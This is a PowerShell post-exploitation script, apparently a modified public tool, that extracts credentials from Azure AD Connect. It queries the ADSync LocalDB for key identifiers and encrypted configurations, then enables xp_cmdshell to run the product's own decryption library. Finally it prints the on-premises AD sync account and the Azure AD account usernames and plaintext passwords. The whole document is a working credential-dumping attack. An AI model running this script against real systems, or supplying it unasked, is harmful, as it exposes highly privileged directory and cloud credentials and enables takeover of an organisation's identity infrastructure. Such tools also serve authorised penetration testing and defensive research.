Write-Host "AD Connect Sync Credential Extract v3 (@_xpn_ & @tijldeneut)"
Write-Host "Modified version by @BigM1ke_oNe"
Write-Host "`t[ Updated to also extract AD Sync account ]"
Write-Host "`t[ Updated to support new cryptokey storage method ]"
Write-Host "`t[ Updated to support Server 2019's new instance name ]`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb with ADSync, trying ADSync2019..."
    try {
        ## Tijl: finding the right instance can be done with `SQLLocalDB.exe i`
        $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"
        $client.Open()
    } catch {
        return
    }
}

Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()



Write-Host "[*] Querying ADSync localdb (mms_management_agent)"
# Read the AAD configuration data
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"

$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null

$ADconfig = $reader.GetString(0)
$ADCryptedConfig = $reader.GetString(1)

$reader.Close()



Write-Host "[*] Querying AAD configuration data"
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null

$AADConfig = $reader.GetString(0)
$AADCryptedConfig = $reader.GetString(1)

$reader.Close()



Write-Host "[*] Using xp_cmdshell to decrypt AD config"

$cmd = $client.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$ADdecryptedConfig = `$null;`$key2.DecryptBase64ToString(''$ADCryptedConfig'', [ref]`$ADdecryptedConfig);Write-Host `$ADdecryptedConfig`"'"
$reader = $cmd.ExecuteReader()

$ADdecryptedConfig = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $ADdecryptedConfig += $reader.GetString(0)
}

if ($ADdecryptedConfig -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

$reader.Close()

Write-Host "[*] Using xp_cmdshell to decrypt AAD config"

$cmd = $client.CreateCommand()

$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$AADdecryptedConfig = `$null;`$key2.DecryptBase64ToString(''$AADCryptedConfig'', [ref]`$AADdecryptedConfig);Write-Host `$AADdecryptedConfig`"'"
$reader = $cmd.ExecuteReader()

$AADdecryptedConfig = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $AADdecryptedConfig += $reader.GetString(0)
}

if ($AADdecryptedConfig -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

$reader.Close()


$ADdomain = select-xml -Content $ADconfig -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$ADusername = select-xml -Content $ADconfig -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$ADpassword = select-xml -Content $ADdecryptedConfig -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

$AADusername = select-xml -Content $AADconfig -XPath "//parameter[@name='UserName']"  | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$AADpassword = select-xml -Content $AADdecryptedConfig -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"

Write-Host "Domain: $($ADdomain.Domain)"
Write-Host "Username: $($ADusername.Username)"
Write-Host "Password: $($ADpassword.Password)"
Write-Host "AADUser: $($AADusername.Username)"
Write-Host "AADPass: $($AADpassword.Password)"



$reader.Close()
$client.Close()
